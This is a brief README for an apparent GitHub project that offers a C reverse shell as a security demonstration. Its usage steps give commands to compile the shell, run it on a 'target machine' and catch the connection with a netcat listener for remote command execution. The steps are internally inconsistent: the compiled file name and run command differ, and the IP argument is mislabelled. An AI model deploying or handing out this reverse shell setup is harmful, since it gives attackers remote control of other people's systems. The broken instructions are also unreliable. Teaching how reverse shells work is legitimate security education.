# Simple Reverse Shell Example

## Overview

This small yet powerful project provides a practical demonstration of a basic reverse shell implementation in C.

A reverse shell is a fundamental concept in network security and penetration testing, allowing an attacker to gain remote control over a compromised system. This example showcases the mechanics of a minimalistic reverse shell, making it an excellent starting point for understanding the core principles behind such exploits.

## Usage

1. Clone the repository to your local machine:

   ```bash
   git clone https://github.com/DavidVardzelian/RevShellExmp.git
2. Move to folder and compile C code:

   ```bash
   cd RevShellExmp
   gcc ReversR.c -o ReverseR
3. Run the reverse shell on the target machine:
	```bash
	./ReversR.exe <TARGET_IP>
4. Set up the listener on your control machine:
	```bash
	nc -l -p 8081
Once the target machine connects, you will have a remote shell to execute commands.
